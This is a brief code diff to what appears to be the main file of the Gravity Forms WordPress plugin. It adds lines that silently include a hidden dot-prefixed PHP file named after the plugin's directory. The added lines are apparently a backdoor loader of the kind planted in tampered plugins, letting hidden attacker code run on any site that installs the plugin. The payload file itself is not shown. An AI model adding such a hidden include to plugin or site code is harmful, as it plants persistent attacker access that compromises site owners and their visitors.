@@ -204,6 +204,10 @@ gf_upgrade();
  *
  * Handles the loading of Gravity Forms and other core functionality
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GFForms {
 
 	/**
